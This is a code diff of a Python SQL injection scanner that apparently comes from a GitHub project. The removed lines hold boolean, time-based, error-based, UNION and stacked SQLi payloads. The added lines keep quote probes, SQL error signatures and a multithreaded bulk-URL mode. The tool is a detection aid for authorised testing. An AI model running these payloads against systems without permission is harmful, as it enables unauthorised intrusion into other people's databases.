@@ -1,362 +1,301 @@
-# IMPORTANT: Run only against systems you own or have permission to test.
-
-import requests
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-import socket
-import os
-from concurrent.futures import ThreadPoolExecutor
-import threading
-from difflib import SequenceMatcher
-import re
-import time
+import requests
+import argparse
 import sys
-import json
+import time
 import csv
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from threading import Lock
+import datetime
 import html
 
-# === CONFIG ===
-WHITE = "\033[1;37m"
-GREEN = "\033[1;32m"
-RED = "\033[1;31m"
-YELLOW = "\033[1;33m"
-RESET = "\033[0m"
+# CONFIG
+DEFAULT_THREADS = 10
+TIMEOUT = 10  # seconds for HTTP requests
+PAUSE_BETWEEN_REQUESTS = 0.35  # polite pause between requests to same host
+OUTPUT_CSV = "scan-report.csv"
+OUTPUT_HTML = "sql-report.html"
 
 HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
-                  'AppleWebKit/537.36 (KHTML, like Gecko) '
-                  'Chrome/140.0.0.0 Safari/537.36 SQLiTest/2.2'
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
 }
-TIMEOUT = 12  # seconds for requests
-THREADS = 10
 
-# set to True to run more aggressive tests (UNION, stacked attempts)
-AGGRESSIVE = False
-
-# thresholds
-DIFF_THRESHOLD = 0.95         # similarity ratio above this => considered same (lowered to reduce FPs)
-BOOLEAN_SIM_THRESHOLD = 0.98  # if true/false responses are very similar -> likely no boolean effect
-TIME_SLEEP_THRESHOLD = 4.0    # seconds extra considered as time-based injection
-VERIFY_TIME_SLEEP_DELAY = 3   # seconds for the verification time-based request (must be less than payload's sleep)
-
-
-print_lock = threading.Lock()
-detected_lock = threading.Lock()
-log_lock = threading.Lock()
-
-all_detected = []  # list of (url, param, method, evidence)
-log_entries = []   # plain text log lines
-
-# regex patterns for common DB error messages (error-based detection)
-DB_ERROR_PATTERNS = [
-    re.compile(r"SQL syntax.*MySQL", re.IGNORECASE),
-    re.compile(r"Warning.*mysql_", re.IGNORECASE),
-    re.compile(r"valid MySQL result", re.IGNORECASE),
-    re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE),
-    re.compile(r"PG::SyntaxError", re.IGNORECASE),
-    re.compile(r"Microsoft SQL Server", re.IGNORECASE),
-    re.compile(r"SQLServerException", re.IGNORECASE),
-    re.compile(r"Unclosed quotation mark after the character string", re.IGNORECASE),
-    re.compile(r"ORA-00933|ORA-01756|ORA-", re.IGNORECASE),
+SQL_ERRORS = [
+    "you have an error in your sql syntax",
+    "warning: mysql",
+    "unclosed quotation mark after the character string",
+    "quoted string not properly terminated",
+    "pg_query()",
+    "supplied argument is not a valid mysql",
+    "mysql_fetch_assoc()",
+    "mysql_num_rows()",
+    "ORA-00933",
+    "ORA-01756",
+    "SQLSTATE[",
+    "SQLite.Exception",
+    "syntax error near",
+    "unterminated quoted string",
+    "mysqlnd::",
 ]
 
-# helper funcs
-def strip_ansi(s: str) -> str:
-    return re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', s)
+# Payload definitions (plain then comment)
+QUOTE_GROUPS = {
+    "single": [
+        {"label": "single-quote", "inj": "'"},
+        {"label": "single-quote-comment", "inj": "' -- "},
+    ],
+    "double": [
+        {"label": "double-quote", "inj": '"'},
+        {"label": "double-quote-comment", "inj": '" -- '},
+    ],
+}
 
-def safe_log(msg: str):
-    """Append plain text message to log_entries (thread-safe)."""
-    with log_lock:
-        log_entries.append(msg)
+lock = Lock()
 
-def safe_print(msg: str):
-    """Print colored msg to console and store stripped msg in log."""
-    with print_lock:
-        print(msg)
-    plain = strip_ansi(msg)
-    safe_log(plain)
+# ANSI color codes
+ANSI_BOLD_WHITE = "\x1b[97;1m"
+ANSI_GREEN = "\x1b[32m"
+ANSI_YELLOW = "\x1b[33m"
+ANSI_RESET = "\x1b[0m"
 
-def similarity(a: str, b: str) -> float:
-    return SequenceMatcher(None, a, b).ratio()
 
-def send_request(url: str, allow_redirects=True, verify_ssl=True):
-    """
-    Send GET request and return dict with response data.
+def is_ssl_cert_error(exc):
+    """Return True if the exception is an SSL certificate verification error we want to ignore.
+    We inspect exception type and message to be robust across platforms.
     """
     try:
-        start = time.time()
-        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT,
-                            allow_redirects=allow_redirects, verify=verify_ssl)
-        elapsed = time.time() - start
-        content = resp.text or ""
-        return {
-            "status": resp.status_code,
-            "headers": dict(resp.headers),
-            "content": content,
-            "content_len": int(resp.headers.get('Content-Length', len(resp.content) if resp.content is not None else 0)),
-            "elapsed": elapsed,
-            "url": resp.url
-        }
+        # requests' SSL failures often come as requests.exceptions.SSLError
+        if isinstance(exc, requests.exceptions.SSLError):
+            return True
+        msg = str(exc).lower()
+        if 'certificate verify failed' in msg or 'ssl' in msg and 'cert' in msg:
+            return True
+    except Exception:
+        pass
+    return False
+
+
+def parse_url_params(url):
+    p = urlparse(url)
+    qs = parse_qs(p.query, keep_blank_values=True)
+    return p, qs
+
+
+def build_url_with_param(parsed_url, qs_dict):
+    query = urlencode({k: v[0] for k, v in qs_dict.items()}, doseq=False)
+    return urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, query, parsed_url.fragment))
+
+
+def looks_like_sql_error(text):
+    if not text:
+        return False
+    lt = text.lower()
+    for sig in SQL_ERRORS:
+        if sig.lower() in lt:
+            return True
+    return False
+
+
+def content_change_amount(a, b):
+    if a is None or b is None:
+        return 0, 0.0
+    la = len(a)
+    lb = len(b)
+    abs_change = abs(la - lb)
+    rel = 1.0 if la == 0 else abs_change / la
+    return abs_change, rel
+
+
+def send_get(url, headers=None, timeout=TIMEOUT):
+    try:
+        return requests.get(url, headers=headers or HEADERS, timeout=timeout, allow_redirects=True)
     except requests.RequestException as e:
-        return {"error": str(e)}
+        return e
 
-def build_url_from_parts(parsed, params):
-    """
-    Build full URL string from parsed result and params dict.
-    """
-    query = urlencode(params, doseq=True)
-    new = (parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment)
-    return urlunparse(new)
 
-# payload sets
-BASIC_PAYLOADS = {
-    "single_quote": ("'", "append single quote"),
-    "double_quote": ('"', "append double quote"),
-    "slash": ("/", "append slash")
-}
+def payload_method_from_label(label):
+    if label.startswith('single'):
+        return 'single'
+    if label.startswith('double'):
+        return 'double'
+    return 'unknown'
 
-BOOLEAN_PAYLOADS = [
-    ("AND_TRUE/FALSE_str", "' AND 'a'='a' -- ", "' AND 'a'='b' -- "),
-    ("AND_TRUE/FALSE_num", " AND 1234=1234 -- ", " AND 1234=1235 -- "),
-    ("OR_TRUE/FALSE", "' OR '1'='1' -- ", "' OR '1'='2' -- "),
-]
 
-TIME_PAYLOADS = [
-    ("MySQL_SLEEP", "' OR SLEEP(5) -- ", 5),
-    ("Postgres_PG_SLEEP", "'; SELECT pg_sleep(5); -- ", 5),
-    ("MSSQL_WAITFOR", "'; WAITFOR DELAY '0:0:5' -- ", 5),
-]
+def perform_single_payload_test(parsed_url, base_qs, param_name, base_value, payload, timeout=TIMEOUT):
+    qs = {k: [v[0] if isinstance(v, list) else v for v in base_qs.get(k, "")] for k in base_qs}
+    qs[param_name] = [base_value]
+    baseline_url = build_url_with_param(parsed_url, qs)
 
-ERROR_PAYLOADS = [
-    "'\"",  # mismatched quotes
-    "' OR extractvalue(1,concat(0x3a,(version()))) -- ",
-    "' OR updatexml(null,concat(0x3a,(version())),null) -- ",
-]
+    r_base = send_get(baseline_url, timeout=timeout)
+    if isinstance(r_base, Exception):
+        # If it's an SSL-cert verification error, return a special marker so caller can skip the whole URL
+        if is_ssl_cert_error(r_base):
+            return {'__ssl_cert__': True, 'error': str(r_base)}
+        return {"param": param_name, "payload": "baseline", "issue": "request-error", "note": str(r_base), "abs_change": 0, "rel_change": 0.0, "method": "-"}
 
-UNION_MARKER = "sqli_test_marker_12345"
-UNION_PAYLOADS = [
-    ("UNION_SIMPLE", "' UNION SELECT '" + UNION_MARKER + "' -- "),
-    ("UNION_NUM", "' UNION SELECT 12345 -- "),
-]
+    base_text = r_base.text
+    base_status = r_base.status_code
 
-STACKED_PAYLOADS = [
-    ("STACKED_SELECT", "'; SELECT 1 -- "),
-]
+    qs_test = dict(qs)
+    qs_test[param_name] = [(qs_test.get(param_name, [""])[0] or "") + payload["inj"]]
+    test_url = build_url_with_param(parsed_url, qs_test)
 
-def make_payload_variants(original_value, payload):
-    return original_value + payload
+    time.sleep(PAUSE_BETWEEN_REQUESTS)
+    r = send_get(test_url, timeout=timeout)
+    if isinstance(r, Exception):
+        if is_ssl_cert_error(r):
+            return {'__ssl_cert__': True, 'error': str(r)}
+        return {"param": param_name, "payload": payload["label"], "issue": "request-error", "note": str(r), "abs_change": 0, "rel_change": 0.0, "method": payload_method_from_label(payload["label"])}
 
-def check_error_patterns(text):
-    for pat in DB_ERROR_PATTERNS:
-        if pat.search(text):
-            return pat.pattern
+    text = r.text
+    status = r.status_code
+
+    abs_ch, rel_ch = content_change_amount(base_text, text)
+    notes = []
+    issue = None
+
+    if looks_like_sql_error(text):
+        notes.append("SQL error signature detected")
+        issue = "error-signature"
+    if status != base_status:
+        notes.append(f"HTTP status {base_status}->{status}")
+        issue = issue or "status-diff"
+    if abs_ch > 0 and rel_ch > 0.002:
+        notes.append(f"response length {len(base_text)} -> {len(text)}")
+        issue = issue or "content-diff"
+
+    if issue:
+        return {"param": param_name, "payload": payload["label"], "issue": issue, "note": "; ".join(notes), "abs_change": abs_ch, "rel_change": rel_ch, "method": payload_method_from_label(payload["label"])}
     return None
 
-def detect_via_diff(base_text, new_text, threshold=DIFF_THRESHOLD):
-    sim = similarity(base_text, new_text)
-    return sim < threshold, sim
 
-def test_parameter(parsed_url, original_params, param_name, original_url, verify_ssl=True):
-    detected = []
+def scan_param(parsed_url, qs, param, base_val, timeout):
+    """
+    Returns: (findings_list, primary_tuple_or_None, ssl_error_info_or_None)
+    If ssl_error_info_or_None is not None, scanning should stop for that URL and be reported as skipped.
+    """
+    findings = []
 
-    safe_print(f"{WHITE}[info] Testing parameter '{param_name}' on {original_url}{RESET}")
+    single_plain = perform_single_payload_test(parsed_url, qs, param, base_val, QUOTE_GROUPS["single"][0], timeout)
+    # check SSL marker
+    if isinstance(single_plain, dict) and single_plain.get('__ssl_cert__'):
+        return [], None, single_plain.get('error')
 
-    base_url = build_url_from_parts(parsed_url, original_params)
-    base_resp = send_request(base_url, verify_ssl=verify_ssl)
-    if "error" in base_resp:
-        safe_print(f"{RED}[error] Base request failed for {original_url}: {base_resp['error']}{RESET}")
-        return detected
+    single_comment = perform_single_payload_test(parsed_url, qs, param, base_val, QUOTE_GROUPS["single"][1], timeout)
+    if isinstance(single_comment, dict) and single_comment.get('__ssl_cert__'):
+        return [], None, single_comment.get('error')
 
-    base_text = base_resp.get("content", "")
-    base_status = base_resp.get("status")
-    base_headers = base_resp.get("headers", {})
-    base_elapsed = base_resp.get("elapsed", 0.0)
-    
-    original_value = original_params.get(param_name, [""])[0]
+    if single_plain:
+        findings.append(single_plain)
+    if single_comment:
+        findings.append(single_comment)
 
-    # 1) ERROR-based (Usually high confidence)
-    for err_pl in ERROR_PAYLOADS:
-        safe_print(f"{YELLOW}[info] Error-inducing payload on '{param_name}'...{RESET}")
-        params_e = {k: list(v) for k, v in original_params.items()}
-        params_e[param_name] = [make_payload_variants(original_value, err_pl)]
-        url_e = build_url_from_parts(parsed_url, params_e)
-        r_e = send_request(url_e, verify_ssl=verify_ssl)
-        if "error" in r_e:
-            safe_print(f"{RED}[error] Error payload request failed: {r_e['error']}{RESET}")
-            continue
-        found = check_error_patterns(r_e.get("content", ""))
-        if found:
-            evidence = f"matched error regex: {found}"
-            safe_print(f"{GREEN}[detected] {original_url} --> error-based on '{param_name}' ({evidence}){RESET}")
-            detected.append((param_name, "error-based", evidence))
+    if findings:
+        primary = max(findings, key=lambda x: (x.get("abs_change", 0), x.get("rel_change", 0)))
+        return findings, (param, primary["payload"], primary["note"], primary.get("abs_change", 0)), None
 
-    # 2) BOOLEAN-based (IMPROVED LOGIC)
-    for bp_name, true_payload, false_payload in BOOLEAN_PAYLOADS:
-        safe_print(f"{YELLOW}[info] Boolean test {bp_name} on '{param_name}'...{RESET}")
-        p_true = {k: list(v) for k, v in original_params.items()}
-        p_false = {k: list(v) for k, v in original_params.items()}
-        p_true[param_name] = [make_payload_variants(original_value, true_payload)]
-        p_false[param_name] = [make_payload_variants(original_value, false_payload)]
-        url_true = build_url_from_parts(parsed_url, p_true)
-        url_false = build_url_from_parts(parsed_url, p_false)
-        r_true = send_request(url_true, verify_ssl=verify_ssl)
-        r_false = send_request(url_false, verify_ssl=verify_ssl)
-        if "error" in r_true or "error" in r_false:
-            safe_print(f"{RED}[error] Boolean request failed: {r_true.get('error')} / {r_false.get('error')}{RESET}")
-            continue
-        
-        content_true = r_true.get("content", "")
-        content_false = r_false.get("content", "")
+    double_plain = perform_single_payload_test(parsed_url, qs, param, base_val, QUOTE_GROUPS["double"][0], timeout)
+    if isinstance(double_plain, dict) and double_plain.get('__ssl_cert__'):
+        return [], None, double_plain.get('error')
 
-        sim_base_true = similarity(base_text, content_true)
-        sim_base_false = similarity(base_text, content_false)
-        sim_true_false = similarity(content_true, content_false)
+    double_comment = perform_single_payload_test(parsed_url, qs, param, base_val, QUOTE_GROUPS["double"][1], timeout)
+    if isinstance(double_comment, dict) and double_comment.get('__ssl_cert__'):
+        return [], None, double_comment.get('error')
 
-        # Vulnerable if:
-        # 1. Base response is SIMILAR to TRUE response.
-        # 2. Base response is DIFFERENT from FALSE response.
-        # 3. TRUE and FALSE responses are DIFFERENT from each other.
-        if (sim_base_true > BOOLEAN_SIM_THRESHOLD and
-            sim_base_false < BOOLEAN_SIM_THRESHOLD and
-            sim_true_false < BOOLEAN_SIM_THRESHOLD):
-            
-            evidence = f"boolean logic confirmed: base/true_sim={sim_base_true:.2f}, base/false_sim={sim_base_false:.2f}"
-            safe_print(f"{GREEN}[detected] {original_url} --> boolean {bp_name} on '{param_name}' ({evidence}){RESET}")
-            detected.append((param_name, f"boolean-{bp_name}", evidence))
+    double_findings = []
+    if double_plain:
+        double_findings.append(double_plain)
+    if double_comment:
+        double_findings.append(double_comment)
 
-    # 3) TIME-based (IMPROVED LOGIC WITH VERIFICATION)
-    for tname, tpayload, tdelay in TIME_PAYLOADS:
-        safe_print(f"{YELLOW}[info] Time-based test {tname} on '{param_name}' (expect ~{tdelay}s)...{RESET}")
-        params_t = {k: list(v) for k, v in original_params.items()}
-        params_t[param_name] = [make_payload_variants(original_value, tpayload)]
-        url_t = build_url_from_parts(parsed_url, params_t)
-        
-        r_t = send_request(url_t, verify_ssl=verify_ssl)
-        if "error" in r_t:
-            safe_print(f"{RED}[error] Time payload request failed: {r_t['error']}{RESET}")
-            continue
-        
-        delta = r_t.get("elapsed", 0.0) - base_elapsed
+    if double_findings:
+        primary = max(double_findings, key=lambda x: (x.get("abs_change", 0), x.get("rel_change", 0)))
+        return double_findings, (param, primary["payload"], primary["note"], primary.get("abs_change", 0)), None
 
-        if delta >= TIME_SLEEP_THRESHOLD:
-            safe_print(f"{YELLOW}[info] Initial delay detected ({delta:.2f}s). Verifying...{RESET}")
-            
-            # Send verification request with a shorter delay
-            verify_payload = tpayload.replace(f"({tdelay})", f"({VERIFY_TIME_SLEEP_DELAY})")
-            verify_payload = verify_payload.replace(f"'{tdelay}'", f"'{VERIFY_TIME_SLEEP_DELAY}'") # for mssql
-            
-            params_v = {k: list(v) for k, v in original_params.items()}
-            params_v[param_name] = [make_payload_variants(original_value, verify_payload)]
-            url_v = build_url_from_parts(parsed_url, params_v)
-            
-            r_v = send_request(url_v, verify_ssl=verify_ssl)
-            delta_v = r_v.get("elapsed", 0.0) - base_elapsed
+    return [], None, None
 
-            if delta_v >= (VERIFY_TIME_SLEEP_DELAY - 1):  # Allow for a 1s margin of error
-                evidence = f"time delay confirmed. Initial: {delta:.2f}s, Verification: {delta_v:.2f}s"
-                safe_print(f"{GREEN}[detected] {original_url} --> time-based {tname} on '{param_name}' ({evidence}){RESET}")
-                detected.append((param_name, f"time-{tname}", evidence))
-            else:
-                safe_print(f"{YELLOW}[info] Time-based false positive suspected. Verification failed (delay: {delta_v:.2f}s).{RESET}")
 
-    # 4) AGGRESSIVE modes (UNION/STACKED)
-    if AGGRESSIVE:
-        # UNION-based
-        for uname, upayload in UNION_PAYLOADS:
-            safe_print(f"{YELLOW}[info] UNION attempt {uname} on '{param_name}'...{RESET}")
-            params_u = {k: list(v) for k, v in original_params.items()}
-            params_u[param_name] = [make_payload_variants(original_value, upayload)]
-            url_u = build_url_from_parts(parsed_url, params_u)
-            r_u = send_request(url_u, verify_ssl=verify_ssl)
-            if "error" in r_u:
-                safe_print(f"{RED}[error] UNION request failed: {r_u['error']}{RESET}")
-                continue
-            if UNION_MARKER in r_u.get("content", ""):
-                evidence = f"marker '{UNION_MARKER}' found"
-                safe_print(f"{GREEN}[detected] {original_url} --> union {uname} on '{param_name}' ({evidence}){RESET}")
-                detected.append((param_name, f"union-{uname}", evidence))
-        
-        # STACKED
-        for sname, spayload in STACKED_PAYLOADS:
-            safe_print(f"{YELLOW}[info] Stacked attempt {sname} on '{param_name}'...{RESET}")
-            params_s = {k: list(v) for k, v in original_params.items()}
-            params_s[param_name] = [make_payload_variants(original_value, spayload)]
-            url_s = build_url_from_parts(parsed_url, params_s)
-            r_s = send_request(url_s, verify_ssl=verify_ssl)
-            if "error" in r_s:
-                safe_print(f"{RED}[error] Stacked request failed: {r_s['error']}{RESET}")
-                continue
-            diff_flag, sim = detect_via_diff(base_text, r_s.get("content", ""))
-            if diff_flag:
-                evidence = f"stacked diff sim={sim:.4f}"
-                safe_print(f"{GREEN}[detected] {original_url} --> stacked {sname} on '{param_name}' ({evidence}){RESET}")
-                detected.append((param_name, f"stacked-{sname}", evidence))
+def write_csv_header(path):
+    with open(path, "w", newline="", encoding="utf-8") as fh:
+        writer = csv.writer(fh)
+        writer.writerow(["url", "param", "payload", "method", "issue", "note", "abs_change", "rel_change"])
 
-    return detected
 
-def test_sqli_url(original_url, verify_ssl=True):
-    try:
-        parsed = urlparse(original_url)
-        original_params = parse_qs(parsed.query)
-    except Exception as e:
-        safe_print(f"{RED}[error] Could not parse URL {original_url}: {e}{RESET}")
-        return
+def append_csv_row(path, row):
+    with open(path, "a", newline="", encoding="utf-8") as fh:
+        writer = csv.writer(fh)
+        writer.writerow(row)
 
-    safe_print(f"{WHITE}[info] Testing URL: {original_url}{RESET}")
 
-    if not original_params:
-        safe_print(f"{YELLOW}[info] URL has no query parameters: {original_url}{RESET}")
-        return
+def human_print_info(msg):
+    print(f"{ANSI_BOLD_WHITE}[i] {msg}{ANSI_RESET}")
 
-    try:
-        ip = socket.gethostbyname(parsed.netloc)
-        safe_print(f"{WHITE}[info] target -> {parsed.netloc} [{ip}]{RESET}")
-    except socket.gaierror:
-        safe_print(f"{RED}[error] Could not resolve hostname: {parsed.netloc}{RESET}")
-        return
 
-    url_detected = []
-    for param in list(original_params.keys()):
-        try:
-            det = test_parameter(parsed, original_params, param, original_url, verify_ssl=verify_ssl)
-            if det:
-                for (pname, method, evidence) in det:
-                    with detected_lock:
-                        all_detected.append((original_url, pname, method, evidence))
-                    url_detected.append((pname, method, evidence))
-        except Exception as exc:
-            safe_print(f"{RED}[error] Exception while testing param {param} on {original_url}: {exc}{RESET}")
+def human_print_detected(msg):
+    print(f"{ANSI_GREEN}[+] {msg}{ANSI_RESET}")
 
-    if not url_detected:
-        safe_print(f"{YELLOW}[info] No detections for URL: {original_url}{RESET}")
 
-def generate_csv(filename="sqli_findings.csv"):
-    if not all_detected:
-        return
-    try:
-        with open(filename, "w", newline="", encoding="utf-8") as csvfile:
-            writer = csv.writer(csvfile)
-            writer.writerow(["url", "parameter", "method", "evidence"])
-            for (url, param, method, evidence) in all_detected:
-                writer.writerow([url, param, method, evidence])
-        safe_print(f"{WHITE}[info] CSV saved: {filename}{RESET}")
-    except Exception as e:
-        safe_print(f"{RED}[error] Failed to save CSV: {e}{RESET}")
+def human_print_warning(msg):
+    print(f"{ANSI_YELLOW}[!] {msg}{ANSI_RESET}")
 
-def generate_html_report(filename="sqli_report.html", run_time_seconds=0, total_urls=0):
-    now = time.strftime("%Y-%m-%d %H:%M:%S")
-    findings_count = len(all_detected)
+
+def scan_url_workflow(url, timeout, csv_path):
+    parsed_url, qs = parse_url_params(url)
+    if not qs:
+        return {"url": url, "error": "no-params", "details": None}
+
+    params = list(qs.keys())
+    url_findings = []
+    url_primaries = []
+
+    for p in params:
+        base_val = qs.get(p, [""])[0]
+        res_findings, primary, ssl_err = scan_param(parsed_url, qs, p, base_val, timeout)
+        if ssl_err:
+            # skip entire URL and report ssl error
+            return {"url": url, "error": "ssl-cert", "details": ssl_err}
+
+        if res_findings:
+            for item in res_findings:
+                # persist to CSV with url context
+                append_csv_row(csv_path, [url, item.get("param"), item.get("payload"), item.get("method"), item.get("issue"), item.get("note"), item.get("abs_change", 0), item.get("rel_change", 0.0)])
+                url_findings.append(item)
+            url_primaries.append(primary)
+    return {"url": url, "findings": url_findings, "primaries": url_primaries}
+
+
+def generate_html_report(results_map, start_time, end_time, csv_path, html_path):
+    now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
+    total_urls = len(results_map)
+    findings_count = 0
     method_counts = {}
-    for (_, _, method, _) in all_detected:
-        method_counts[method] = method_counts.get(method, 0) + 1
+    rows = []
 
-    rows_html = ""
-    for (url, param, method, evidence) in all_detected:
-        rows_html += "<tr>"
-        rows_html += f"<td>{html.escape(url)}</td>"
-        rows_html += f"<td>{html.escape(param)}</td>"
-        rows_html += f"<td>{html.escape(method)}</td>"
-        rows_html += f"<td>{html.escape(evidence)}</td>"
-        rows_html += "</tr>\n"
+    for url, res in results_map.items():
+        if not res:
+            continue
+        if res.get('error') == 'ssl-cert':
+            # do not count SSL-skipped URLs as findings
+            continue
+        if res.get('error'):
+            continue
+        for f in res.get('findings', []):
+            findings_count += 1
+            method = f.get('method', 'unknown')
+            method_counts[method] = method_counts.get(method, 0) + 1
+            rows.append((url, f.get('param'), method, f.get('note')))
+
+    run_time_seconds = (end_time - start_time)
+
+    # build rows_html
+    rows_html = ''
+    for url, param, method, note in rows:
+        rows_html += '<tr>'
+        rows_html += f'<td>{html.escape(url)}</td>'
+        rows_html += f'<td>{html.escape(param)}</td>'
+        rows_html += f'<td>{html.escape(method)}</td>'
+        rows_html += f'<td>{html.escape(note)}</td>'
+        rows_html += '</tr>'
 
     html_content = f"""<!doctype html>
     <html lang="en">
@@ -371,8 +310,8 @@ def generate_html_report(filename="sqli_report.html", run_time_seconds=0, total_
     th,td{{padding:10px;border:1px solid #ddd;text-align:left;font-size:14px;word-break:break-all;}}
     th{{background:#222;color:#fff}}
     .summary{{margin:20px 0;padding:15px;background:#fafafa;border:1px solid #eee;border-radius:6px}}
-    .badge{{display:inline-block;padding:4px 10px;border-radius:6px;background:#eee;margin:0 5px 5px 0;font-size:12px;}}
-    .github-link-top{{position:fixed;top:15px;right:20px;text-decoration:none;font-weight:bold;color:#444;background:#fff;padding:6px 12px;border-radius:5px;box-shadow:0 2px 8px rgba(0,0,0,0.1);border:1px solid #ddd;}}
+    .badge{{display:inline-block;padding:4px 10px;border-radius:6px;background:#eee;margin:0 5px 5px 0;font-size:12px}}
+    .github-link-top{{position:fixed;top:15px;right:20px;text-decoration:none;font-weight:bold;color:#444;background:#fff;padding:6px 12px;border-radius:5px;box-shadow:0 2px 8px rgba(0,0,0,0.1);border:1px solid #ddd}}
     .github-link-top:hover{{background:#f5f5f5;}}
     .footer{{text-align:center;margin-top:25px;padding-top:20px;border-top:1px solid #eee;font-size:12px;color:#777;}}
     .footer p{{margin:5px 0;}}
@@ -403,77 +342,141 @@ def generate_html_report(filename="sqli_report.html", run_time_seconds=0, total_
     </body>
     </html>
     """
+
     try:
-        with open(filename, "w", encoding="utf-8") as fh:
+        with open(html_path, 'w', encoding='utf-8') as fh:
             fh.write(html_content)
-        safe_print(f"{WHITE}[info] HTML report saved: {filename}{RESET}")
-    except Exception as e:
-        safe_print(f"{RED}[error] Failed to save HTML report: {e}{RESET}")
+        return html_path
+    except Exception:
+        return None
 
-def save_plain_log(filename="sqli_run.log"):
+
+def run_single_mode(timeout, csv_path, html_path):
+    url = input("Enter target URL (include scheme and query string): ").strip()
+    human_print_info(f"Scanning {url} ...")
+    write_csv_header(csv_path)
+    start = time.time()
+    res = scan_url_workflow(url, timeout, csv_path)
+    end = time.time()
+
+    results_map = {url: res}
+    html_file = generate_html_report(results_map, start, end, csv_path, html_path)
+
+    print("\n=== Result for URL ===")
+    if res.get("error") == "no-params":
+        human_print_info("No query parameters detected in the given URL. Nothing to test.")
+        return
+
+    if res.get('error') == 'ssl-cert':
+        human_print_warning(f"Skipped URL due to SSL certificate error: {res.get('details')}")
+        human_print_info("This URL was not considered as 'detected'.")
+        if html_file:
+            human_print_info(f"HTML report written to: {html_file}")
+        return
+
+    if not res.get("primaries"):
+        human_print_info("No strong evidence of SQL injection found for this URL (with these heuristic checks).")
+    else:
+        prim = sorted(res["primaries"], key=lambda x: x[3] or 0, reverse=True)
+        human_print_detected(f"Potential issues detected: {len(prim)}")
+        for p in prim:
+            print(f" {ANSI_GREEN}* param={p[0]}, payload={p[1]}, note={p[2]} (abs_change={p[3]}){ANSI_RESET}")
+
+    if html_file:
+        human_print_info(f"HTML report written to: {html_file}")
+    else:
+        human_print_info("Failed to write HTML report.")
+
+
+def run_file_mode(timeout, csv_path, html_path):
+    path = input("Enter path to text file with URLs (one per line): ").strip()
     try:
-        with open(filename, "w", encoding="utf-8") as fh:
-            for line in log_entries:
-                fh.write(line + "\n")
-        safe_print(f"{WHITE}[info] Plain log saved: {filename}{RESET}")
+        with open(path, "r", encoding="utf-8") as fh:
+            urls = [line.strip() for line in fh if line.strip()]
     except Exception as e:
-        safe_print(f"{RED}[error] Failed to save plain log: {e}{RESET}")
+        print(f"[!] Failed to read file: {e}")
+        return
 
+    if not urls:
+        human_print_info("File contains no URLs.")
+        return
+
+    try:
+        threads = int(input(f"Enter number of threads to use for scanning URLs (default {DEFAULT_THREADS}): ").strip() or DEFAULT_THREADS)
+    except Exception:
+        threads = DEFAULT_THREADS
+
+    human_print_info(f"Loaded {len(urls)} URLs — scanning with {threads} threads. Results will be printed in file order.")
+
+    write_csv_header(csv_path)
+
+    results_map = {}
+
+    start = time.time()
+    # use ThreadPoolExecutor to scan URLs concurrently but collect results
+    with ThreadPoolExecutor(max_workers=threads) as ex:
+        future_to_url = {ex.submit(scan_url_workflow, url, timeout, csv_path): url for url in urls}
+        for fut in as_completed(future_to_url):
+            url = future_to_url[fut]
+            try:
+                res = fut.result()
+            except Exception as e:
+                res = {"url": url, "error": "exception", "details": str(e)}
+            results_map[url] = res
+    end = time.time()
+
+    # print results in the same order as input
+    for url in urls:
+        res = results_map.get(url)
+        print(f"\n=== Result for URL: {url} ===")
+        if not res:
+            human_print_info("No result returned (internal error).")
+            continue
+        if res.get("error") == "no-params":
+            human_print_info("No query parameters detected in the given URL. Nothing to test.")
+            continue
+        if res.get('error') == 'ssl-cert':
+            human_print_warning(f"Skipped URL due to SSL certificate error: {res.get('details')}")
+            human_print_info("This URL was not considered as 'detected'.")
+            continue
+        if res.get("findings") and res.get("primaries"):
+            prim = sorted(res["primaries"], key=lambda x: x[3] or 0, reverse=True)
+            human_print_detected(f"Potential issues detected: {len(prim)}")
+            for p in prim:
+                print(f" {ANSI_GREEN}* param={p[0]}, payload={p[1]}, note={p[2]} (abs_change={p[3]}){ANSI_RESET}")
+            # also list other findings
+            for f in res["findings"]:
+                print(f"    - payload={f['payload']}, issue={f['issue']}, note={f['note']} (abs_change={f.get('abs_change',0)})")
+        else:
+            human_print_info("No strong evidence of SQL injection found for this URL (with these heuristic checks).")
+
+    # generate aggregated html report
+    html_file = generate_html_report(results_map, start, end, csv_path, html_path)
+    if html_file:
+        human_print_info(f"HTML report written to: {html_file}")
+    else:
+        human_print_info("Failed to write HTML report.")
+
+# https://github.com/Am1rX/Fast-SQLi
 def main():
-    safe_print("Choose option:")
-    safe_print("1. Single URL")
-    safe_print("2. Multi URL from urls.txt")
-    choice = input("Enter choice (1 or 2): ").strip()
+    print("[!] Use this tool only on systems you own or have explicit written permission to test.\nThe developer assumes no liability for misuse or damages.\n")
+    parser = argparse.ArgumentParser(description="Interactive multi-mode SQLi detector (v5 fixed) with HTML output")
+    parser.add_argument("--timeout", type=int, default=TIMEOUT, help=f"HTTP timeout seconds (default {TIMEOUT})")
+    parser.add_argument("--csv", default=OUTPUT_CSV, help=f"CSV output file (default {OUTPUT_CSV})")
+    parser.add_argument("--html", default=OUTPUT_HTML, help=f"HTML report file (default {OUTPUT_HTML})")
+    args = parser.parse_args()
 
-    urls = []
-    if choice == "1":
-        urls = [input("Enter the URL (e.g., http://example.com/page.php?id=1): ").strip()]
-    elif choice == "2":
-        if not os.path.isfile("urls.txt"):
-            safe_print(f"{RED}[error] urls.txt not found in current directory.{RESET}")
-            sys.exit(1)
-        with open("urls.txt", "r", encoding="utf-8") as f:
-            urls = [line.strip() for line in f if line.strip()]
+    human_print_info("Select mode:")
+    human_print_info("  1) Test a single URL")
+    human_print_info("  2) Test a list of URLs from a text file")
+    mode = input("Enter 1 or 2: ").strip()
+    if mode == "1":
+        run_single_mode(args.timeout, args.csv, args.html)
+    elif mode == "2":
+        run_file_mode(args.timeout, args.csv, args.html)
     else:
-        safe_print(f"{RED}[error] Invalid choice.{RESET}")
